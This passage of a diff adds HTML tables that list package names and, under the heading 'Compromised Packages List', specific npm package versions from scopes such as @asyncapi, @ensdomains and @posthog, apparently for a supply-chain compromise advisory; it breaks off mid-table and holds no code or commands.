+<td align="left">@voiceflow/slate-serializer</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/stitches-react</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/storybook-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/stylelint-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/test-common</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/tsconfig</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/tsconfig-paths</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/utils-designer</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/verror</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/vite-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/vitest-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/voice-types</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/voiceflow-types</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/widget</td>
+</tr>
+<tr>
+<td align="left">02-echo</td>
+</tr>
+<tr>
+<td align="left">ai-crowl-shield</td>
+</tr>
+<tr>
+<td align="left">arc-cli-fc</td>
+</tr>
+<tr>
+<td align="left">automation_model</td>
+</tr>
+<tr>
+<td align="left">benmostyn-frame-print</td>
+</tr>
+<tr>
+<td align="left">bidirectional-adapter</td>
+</tr>
+<tr>
+<td align="left">blob-to-base64</td>
+</tr>
+<tr>
+<td align="left">colors-regex</td>
+</tr>
+<tr>
+<td align="left">composite-reducer</td>
+</tr>
+<tr>
+<td align="left">css-dedoupe</td>
+</tr>
+<tr>
+<td align="left">dashboard-empty-state</td>
+</tr>
+<tr>
+<td align="left">dialogflow-es</td>
+</tr>
+<tr>
+<td align="left">docusaurus-plugin-vanilla-extract</td>
+</tr>
+<tr>
+<td align="left">dont-go</td>
+</tr>
+<tr>
+<td align="left">email-deliverability-tester</td>
+</tr>
+<tr>
+<td align="left">eslint-config-nitpicky</td>
+</tr>
+<tr>
+<td align="left">expressos</td>
+</tr>
+<tr>
+<td align="left">fat-fingered</td>
+</tr>
+<tr>
+<td align="left">firestore-search-engine</td>
+</tr>
+<tr>
+<td align="left">generator-meteor-stock</td>
+</tr>
+<tr>
+<td align="left">generator-ng-itobuz</td>
+</tr>
+<tr>
+<td align="left">gulp-inject-envs</td>
+</tr>
+<tr>
+<td align="left">hover-design-prototype</td>
+</tr>
+<tr>
+<td align="left">httpness</td>
+</tr>
+<tr>
+<td align="left">hyper-fullfacing</td>
+</tr>
+<tr>
+<td align="left">itobuz-angular-button</td>
+</tr>
+<tr>
+<td align="left">jsonsurge</td>
+</tr>
+<tr>
+<td align="left">kwami</td>
+</tr>
+<tr>
+<td align="left">lang-codes</td>
+</tr>
+<tr>
+<td align="left">mod10-check-digit</td>
+</tr>
+<tr>
+<td align="left">n8n-nodes-vercel-ai-sdk</td>
+</tr>
+<tr>
+<td align="left">n8n-nodes-viral-app</td>
+</tr>
+<tr>
+<td align="left">next-simple-google-analytics</td>
+</tr>
+<tr>
+<td align="left">next-styled-nprogress</td>
+</tr>
+<tr>
+<td align="left">ngx-useful-swiper-prosenjit</td>
+</tr>
+<tr>
+<td align="left">ngx-wooapi</td>
+</tr>
+<tr>
+<td align="left">normal-store</td>
+</tr>
+<tr>
+<td align="left">orchestrix</td>
+</tr>
+<tr>
+<td align="left">package-tester</td>
+</tr>
+<tr>
+<td align="left">pdf-annotation</td>
+</tr>
+<tr>
+<td align="left">pkg-readme</td>
+</tr>
+<tr>
+<td align="left">prime-one-table</td>
+</tr>
+<tr>
+<td align="left">prompt-eng</td>
+</tr>
+<tr>
+<td align="left">prompt-eng-server</td>
+</tr>
+<tr>
+<td align="left">puny-req</td>
+</tr>
+<tr>
+<td align="left">ra-auth-firebase</td>
+</tr>
+<tr>
+<td align="left">react-favic</td>
+</tr>
+<tr>
+<td align="left">react-hook-form-persist</td>
+</tr>
+<tr>
+<td align="left">react-linear-loader</td>
+</tr>
+<tr>
+<td align="left">react-micromodal.js</td>
+</tr>
+<tr>
+<td align="left">react-native-google-maps-directions</td>
+</tr>
+<tr>
+<td align="left">react-native-modest-checkbox</td>
+</tr>
+<tr>
+<td align="left">react-native-modest-storage</td>
+</tr>
+<tr>
+<td align="left">samesame</td>
+</tr>
+<tr>
+<td align="left">selenium-session</td>
+</tr>
+<tr>
+<td align="left">selenium-session-client</td>
+</tr>
+<tr>
+<td align="left">shelf-jwt-sessions</td>
+</tr>
+<tr>
+<td align="left">solomon-api-stories</td>
+</tr>
+<tr>
+<td align="left">solomon-v3-stories</td>
+</tr>
+<tr>
+<td align="left">solomon-v3-ui-wrapper</td>
+</tr>
+<tr>
+<td align="left">south-african-id-info</td>
+</tr>
+<tr>
+<td align="left">stat-fns</td>
+</tr>
+<tr>
+<td align="left">super-commit</td>
+</tr>
+<tr>
+<td align="left">svelte-toasty</td>
+</tr>
+<tr>
+<td align="left">tanstack-shadcn-table</td>
+</tr>
+<tr>
+<td align="left">tcsp</td>
+</tr>
+<tr>
+<td align="left">tcsp-test-vd</td>
+</tr>
+<tr>
+<td align="left">template-lib</td>
+</tr>
+<tr>
+<td align="left">template-micro-service</td>
+</tr>
+<tr>
+<td align="left">tiaan</td>
+</tr>
+<tr>
+<td align="left">typefence</td>
+</tr>
+<tr>
+<td align="left">upload-to-play-store</td>
+</tr>
+<tr>
+<td align="left">use-unsaved-changes</td>
+</tr>
+<tr>
+<td align="left">valid-south-african-id</td>
+</tr>
+<tr>
+<td align="left">vf-oss-template</td>
+</tr>
+<tr>
+<td align="left">web-scraper-mcp</td>
+</tr>
+<tr>
+<td align="left">wellness-expert-ng-gallery</td>
+</tr>
+<tr>
+<td align="left">zuper-stream</td>
+</tr>
+</tbody>
+</table>
+<h2 id="compromised-packages-list"><a href="#compromised-packages-list" aria-hidden="true" tabindex="-1">Compromised Packages List</a></h2>
+<table>
+<thead>
+<tr>
+<th align="left">package_name</th>
+<th align="left">versions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">@accordproject/concerto-analysis</td>
+<td align="left">[3.24.1]</td>
+</tr>
+<tr>
+<td align="left">@accordproject/concerto-linter-default-ruleset</td>
+<td align="left">[3.24.1]</td>
+</tr>
+<tr>
+<td align="left">@accordproject/concerto-linter</td>
+<td align="left">[3.24.1]</td>
+</tr>
+<tr>
+<td align="left">@accordproject/concerto-metamodel</td>
+<td align="left">[3.12.5]</td>
+</tr>
+<tr>
+<td align="left">@accordproject/concerto-types</td>
+<td align="left">[3.24.1]</td>
+</tr>
+<tr>
+<td align="left">@accordproject/markdown-it-cicero</td>
+<td align="left">[0.16.26]</td>
+</tr>
+<tr>
+<td align="left">@accordproject/template-engine</td>
+<td align="left">[2.7.2]</td>
+</tr>
+<tr>
+<td align="left">@actbase/css-to-react-native-transform</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@actbase/native</td>
+<td align="left">[0.1.32]</td>
+</tr>
+<tr>
+<td align="left">@actbase/node-server</td>
+<td align="left">[1.1.19]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-absolute</td>
+<td align="left">[0.8.3]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-daum-postcode</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-kakaosdk</td>
+<td align="left">[0.9.27]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-actionsheet</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-devtools</td>
+<td align="left">[0.1.3]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-fast-image</td>
+<td align="left">[8.5.13]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-kakao-channel</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-kakao-navi</td>
+<td align="left">[2.0.4]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-less-transformer</td>
+<td align="left">[1.0.6]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-naver-login</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-simple-video</td>
+<td align="left">[1.0.13]</td>
+</tr>
+<tr>
+<td align="left">@actbase/react-native-tiktok</td>
+<td align="left">[1.1.3]</td>
+</tr>
+<tr>
+<td align="left">@alaan/s2s-auth</td>
+<td align="left">[2.0.3]</td>
+</tr>
+<tr>
+<td align="left">@alexcolls/nuxt-socket.io</td>
+<td align="left">[0.0.7],[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@alexcolls/nuxt-ux</td>
+<td align="left">[0.6.1],[0.6.2]</td>
+</tr>
+<tr>
+<td align="left">@antstackio/eslint-config-antstack</td>
+<td align="left">[0.0.3]</td>
+</tr>
+<tr>
+<td align="left">@antstackio/express-graphql-proxy</td>
+<td align="left">[0.2.8]</td>
+</tr>
+<tr>
+<td align="left">@antstackio/graphql-body-parser</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">@antstackio/json-to-graphql</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@antstackio/shelbysam</td>
+<td align="left">[1.1.7]</td>
+</tr>
+<tr>
+<td align="left">@aryanhussain/my-angular-lib</td>
+<td align="left">[0.0.23]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/avro-schema-parser</td>
+<td align="left">[3.0.25],[3.0.26]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/bundler</td>
+<td align="left">[0.6.5],[0.6.6]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/cli</td>
+<td align="left">[4.1.2],[4.1.3]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/converter</td>
+<td align="left">[1.6.3],[1.6.4]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/diff</td>
+<td align="left">[0.5.1],[0.5.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/dotnet-rabbitmq-template</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/edavisualiser</td>
+<td align="left">[1.2.1],[1.2.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/generator-components</td>
+<td align="left">[0.3.2],[0.3.3]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/generator-helpers</td>
+<td align="left">[0.2.1],[0.2.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/generator-react-sdk</td>
+<td align="left">[1.1.4],[1.1.5]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/generator</td>
+<td align="left">[2.8.5],[2.8.6]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/go-watermill-template</td>
+<td align="left">[0.2.76],[0.2.77]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/html-template</td>
+<td align="left">[3.3.2],[3.3.3]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/java-spring-cloud-stream-template</td>
+<td align="left">[0.13.5],[0.13.6]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/java-spring-template</td>
+<td align="left">[1.6.1],[1.6.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/java-template</td>
+<td align="left">[0.3.5],[0.3.6]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/keeper</td>
+<td align="left">[0.0.2],[0.0.3]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/markdown-template</td>
+<td align="left">[1.6.8],[1.6.9]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/modelina-cli</td>
+<td align="left">[5.10.2],[5.10.3]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/modelina</td>
+<td align="left">[5.10.2],[5.10.3]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/multi-parser</td>
+<td align="left">[2.2.1],[2.2.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/nodejs-template</td>
+<td align="left">[3.0.5],[3.0.6]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/nodejs-ws-template</td>
+<td align="left">[0.10.1],[0.10.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/nunjucks-filters</td>
+<td align="left">[2.1.1],[2.1.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/openapi-schema-parser</td>
+<td align="left">[3.0.25],[3.0.26]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/optimizer</td>
+<td align="left">[1.0.5],[1.0.6]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/parser</td>
+<td align="left">[3.4.1],[3.4.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/php-template</td>
+<td align="left">[0.1.1],[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/problem</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/protobuf-schema-parser</td>
+<td align="left">[3.5.2],[3.5.3],[3.6.1]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/python-paho-template</td>
+<td align="left">[0.2.14],[0.2.15]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/react-component</td>
+<td align="left">[2.6.6],[2.6.7]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/server-api</td>
+<td align="left">[0.16.24],[0.16.25]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/specs</td>
+<td align="left">[6.10.1],[6.8.2],[6.8.3],[6.9.1]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/studio</td>
+<td align="left">[1.0.2],[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@asyncapi/web-component</td>
+<td align="left">[2.6.6],[2.6.7]</td>
+</tr>
+<tr>
+<td align="left">@browserbasehq/bb9</td>
+<td align="left">[1.2.21]</td>
+</tr>
+<tr>
+<td align="left">@browserbasehq/director-ai</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@browserbasehq/mcp-server-browserbase</td>
+<td align="left">[2.4.2]</td>
+</tr>
+<tr>
+<td align="left">@browserbasehq/mcp</td>
+<td align="left">[2.1.1]</td>
+</tr>
+<tr>
+<td align="left">@browserbasehq/sdk-functions</td>
+<td align="left">[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">@browserbasehq/stagehand-docs</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@browserbasehq/stagehand</td>
+<td align="left">[3.0.4]</td>
+</tr>
+<tr>
+<td align="left">@caretive/caret-cli</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@clausehq/flows-step-httprequest</td>
+<td align="left">[0.1.14]</td>
+</tr>
+<tr>
+<td align="left">@clausehq/flows-step-jsontoxml</td>
+<td align="left">[0.1.14]</td>
+</tr>
+<tr>
+<td align="left">@clausehq/flows-step-mqtt</td>
+<td align="left">[0.1.14]</td>
+</tr>
+<tr>
+<td align="left">@clausehq/flows-step-sendgridemail</td>
+<td align="left">[0.1.14]</td>
+</tr>
+<tr>
+<td align="left">@clausehq/flows-step-taskscreateurl</td>
+<td align="left">[0.1.14]</td>
+</tr>
+<tr>
+<td align="left">@commute/bloom</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@commute/market-data-chartjs</td>
+<td align="left">[2.3.1]</td>
+</tr>
+<tr>
+<td align="left">@commute/market-data</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@dev-blinq/ai-qa-logic</td>
+<td align="left">[1.0.19]</td>
+</tr>
+<tr>
+<td align="left">@dev-blinq/blinqioclient</td>
+<td align="left">[1.0.21]</td>
+</tr>
+<tr>
+<td align="left">@dev-blinq/cucumber_client</td>
+<td align="left">[1.0.738]</td>
+</tr>
+<tr>
+<td align="left">@dev-blinq/cucumber-js</td>
+<td align="left">[1.0.131]</td>
+</tr>
+<tr>
+<td align="left">@dev-blinq/ui-systems</td>
+<td align="left">[1.0.93]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/address-encoder</td>
+<td align="left">[1.1.5]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/blacklist</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/buffer</td>
+<td align="left">[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ccip-read-cf-worker</td>
+<td align="left">[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ccip-read-dns-gateway</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ccip-read-router</td>
+<td align="left">[0.0.7]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ccip-read-worker-viem</td>
+<td align="left">[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/content-hash</td>
+<td align="left">[3.0.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/curvearithmetics</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/cypress-metamask</td>
+<td align="left">[1.2.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/dnsprovejs</td>
+<td align="left">[0.5.3]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/dnssec-oracle-anchors</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/dnssecoraclejs</td>
+<td align="left">[0.2.9]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/durin-middleware</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/durin</td>
+<td align="left">[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ens-archived-contracts</td>
+<td align="left">[0.0.3]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ens-avatar</td>
+<td align="left">[1.0.4]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ens-contracts</td>
+<td align="left">[1.6.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ens-test-env</td>
+<td align="left">[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ens-validation</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ensjs-react</td>
+<td align="left">[0.0.5]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ensjs</td>
+<td align="left">[4.0.3]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/eth-ens-namehash</td>
+<td align="left">[2.0.16]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/hackathon-registrar</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/hardhat-chai-matchers-viem</td>
+<td align="left">[0.1.15]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/hardhat-toolbox-viem-extended</td>
+<td align="left">[0.0.6]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/mock</td>
+<td align="left">[2.1.52]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/name-wrapper</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/offchain-resolver-contracts</td>
+<td align="left">[0.2.2]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/op-resolver-contracts</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/react-ens-address</td>
+<td align="left">[0.0.32]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/renewal-widget</td>
+<td align="left">[0.1.10]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/renewal</td>
+<td align="left">[0.0.13]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/reverse-records</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/server-analytics</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/solsha1</td>
+<td align="left">[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/subdomain-registrar</td>
+<td align="left">[0.2.4]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/test-utils</td>
+<td align="left">[1.3.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/thorin</td>
+<td align="left">[0.6.51]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/ui</td>
+<td align="left">[3.4.6]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/unicode-confusables</td>
+<td align="left">[0.1.1]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/unruggable-gateways</td>
+<td align="left">[0.0.3]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/vite-plugin-i18next-loader</td>
+<td align="left">[4.0.4]</td>
+</tr>
+<tr>
+<td align="left">@ensdomains/web3modal</td>
+<td align="left">[1.10.2]</td>
+</tr>
+<tr>
+<td align="left">@everreal/react-charts</td>
+<td align="left">[2.0.1],[2.0.2]</td>
+</tr>
+<tr>
+<td align="left">@everreal/validate-esmoduleinterop-imports</td>
+<td align="left">[1.4.4],[1.4.5]</td>
+</tr>
+<tr>
+<td align="left">@everreal/web-analytics</td>
+<td align="left">[0.0.1],[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@faq-component/core</td>
+<td align="left">[0.0.4]</td>
+</tr>
+<tr>
+<td align="left">@faq-component/react</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@fishingbooker/browser-sync-plugin</td>
+<td align="left">[1.0.5]</td>
+</tr>
+<tr>
+<td align="left">@fishingbooker/react-loader</td>
+<td align="left">[1.0.7]</td>
+</tr>
+<tr>
+<td align="left">@fishingbooker/react-pagination</td>
+<td align="left">[2.0.6]</td>
+</tr>
+<tr>
+<td align="left">@fishingbooker/react-raty</td>
+<td align="left">[2.0.1]</td>
+</tr>
+<tr>
+<td align="left">@fishingbooker/react-swiper</td>
+<td align="left">[0.1.5]</td>
+</tr>
+<tr>
+<td align="left">@hapheus/n8n-nodes-pgp</td>
+<td align="left">[1.5.1]</td>
+</tr>
+<tr>
+<td align="left">@hover-design/core</td>
+<td align="left">[0.0.1]</td>
+</tr>
+<tr>
+<td align="left">@hover-design/react</td>
+<td align="left">[0.2.1]</td>
+</tr>
+<tr>
+<td align="left">@ifelsedeveloper/protocol-contracts-svm-idl</td>
+<td align="left">[0.1.2]</td>
+</tr>
+<tr>
+<td align="left">@ifings/design-system</td>
+<td align="left">[4.9.2]</td>
+</tr>
+<tr>
+<td align="left">@ifings/metatron3</td>
+<td align="left">[0.1.5]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/cli</td>
+<td align="left">[0.0.7]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/components</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/habbit-e2e-test</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/medusa-plugin-announcement</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/medusa-plugin-management</td>
+<td align="left">[0.0.5]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/medusa-plugin-newsletter</td>
+<td align="left">[0.0.5]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/medusa-plugin-product-reviews</td>
+<td align="left">[0.0.9]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/medusa-plugin-promotion</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@kvytech/web</td>
+<td align="left">[0.0.2]</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/api-client</td>
+<td align="left">[9.12.2],[9.12.3]</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/babel-preset</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/electron-group-api-client</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/eslint-config</td>
+<td align="left">[1.4.2]</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/material-icons</td>
+<td align="left">[1.0.3]</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/react-table-context</td>
+<td align="left">[2.0.4]</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/schoolbus</td>
+<td align="left">[5.2.2],[5.2.3]</td>
+</tr>
+<tr>
+<td align="left">@louisle2/core</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@louisle2/cortex-js</td>
+<td align="left">[0.1.6]</td>
+</tr>
+<tr>
+<td align="left">@lpdjs/firestore-repo-service</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@markvivanco/app-version-checker</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@mcp-use/cli</td>
+<td align="left">[2.2.6],[2.2.7]</td>
+</tr>
+<tr>
+<td align="left">@mcp-use/inspector</td>
+<td align="left">[0.6.2],[0.6.3]</td>
+</tr>
+<tr>
+<td align="left">@mcp-use/mcp-use</td>
+<td align="left">[1.0.1],[1.0.2]</td>
+</tr>
+<tr>
+<td align="left">@mparpaillon/connector-parse</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@mparpaillon/imagesloaded</td>
+<td align="left">[4.1.2]</td>
+</tr>
+<tr>
+<td align="left">@mparpaillon/page</td>
+<td align="left">[1.0.1]</td>
+</tr>
+<tr>
+<td align="left">@ntnx/passport-wso2</td>
+<td align="left">[0.0.3]</td>
+</tr>
+<tr>
+<td align="left">@ntnx/t</td>
+<td align="left">[0.0.101]</td>
+</tr>
+<tr>
+<td align="left">@orbitgtbelgium/mapbox-gl-draw-cut-polygon-mode</td>
+<td align="left">[2.0.5]</td>
+</tr>
+<tr>
+<td align="left">@orbitgtbelgium/mapbox-gl-draw-scale-rotate-mode</td>
+<td align="left">[1.1.1]</td>
+</tr>
+<tr>
+<td align="left">@orbitgtbelgium/orbit-components</td>
+<td align="left">[1.2.9]</td>
+</tr>
+<tr>
+<td align="left">@orbitgtbelgium/time-slider</td>
+<td align="left">[1.0.187]</td>
+</tr>
+<tr>
+<td align="left">@osmanekrem/bmad</td>
+<td align="left">[1.0.6]</td>
+</tr>
+<tr>
+<td align="left">@osmanekrem/error-handler</td>
+<td align="left">[1.2.2]</td>
+</tr>
+<tr>
+<td align="left">@posthog/agent</td>
+<td align="left">[1.24.1]</td>
+</tr>
+<tr>
+<td align="left">@posthog/ai</td>
+<td align="left">[7.1.2]</td>
+</tr>
+<tr>
+<td align="left">@posthog/automatic-cohorts-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/bitbucket-release-tracker</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/cli</td>
+<td align="left">[0.5.15]</td>
+</tr>
+<tr>
+<td align="left">@posthog/clickhouse</td>
+<td align="left">[1.7.1]</td>
+</tr>
+<tr>
+<td align="left">@posthog/core</td>
+<td align="left">[1.5.6]</td>
+</tr>
+<tr>
+<td align="left">@posthog/currency-normalization-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/customerio-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/databricks-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/drop-events-on-property-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/event-sequence-timer-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/filter-out-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/first-time-event-tracker</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/geoip-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/github-release-tracking-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/gitub-star-sync-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/heartbeat-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/hedgehog-mode</td>
+<td align="left">[0.0.42]</td>
+</tr>
+<tr>
+<td align="left">@posthog/icons</td>
+<td align="left">[0.36.1]</td>
+</tr>
+<tr>
+<td align="left">@posthog/ingestion-alert-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/intercom-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/kinesis-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/laudspeaker-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/lemon-ui</td>
+<td align="left">[0.0.1]</td>
+</tr>
+<tr>
+<td align="left">@posthog/maxmind-plugin</td>
+<td align="left">[0.1.6]</td>
+</tr>
+<tr>
+<td align="left">@posthog/migrator3000-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/netdata-event-processing</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/nextjs-config</td>
+<td align="left">[1.5.1]</td>
+</tr>
+<tr>
+<td align="left">@posthog/nextjs</td>
+<td align="left">[0.0.3]</td>
+</tr>
+<tr>
+<td align="left">@posthog/nuxt</td>
+<td align="left">[1.2.9]</td>
+</tr>
+<tr>
+<td align="left">@posthog/pagerduty-plugin</td>
+<td align="left">[0.0.8]</td>
+</tr>
+<tr>
+<td align="left">@posthog/piscina</td>
+<td align="left">[3.2.1]</td>
+</tr>
+<tr>
+<td align="left">@posthog/plugin-contrib</td>
